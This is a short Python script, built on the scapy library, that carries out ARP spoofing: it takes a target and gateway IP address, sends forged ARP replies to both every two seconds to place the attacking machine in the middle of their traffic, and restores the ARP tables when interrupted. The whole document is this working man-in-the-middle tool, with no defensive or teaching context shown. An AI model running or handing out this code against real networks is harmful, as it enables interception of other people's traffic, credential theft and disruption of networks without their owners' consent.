#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    answered_list[0]
    return answered_list[0][1].hwsrc


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP Address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP Address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify Target IP Address")
    elif not options.gateway:
        parser.error("[-] Please specify Gateway IP Address")
    return options


def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


options=get_arguments()
target=options.target
gateway=options.gateway
sent_packet_count = 0
try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        sent_packet_count += 2
        print("\r[+] Packet Sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP Tables...Please wait!!!")
    restore(target, gateway)
    restore(gateway, target)
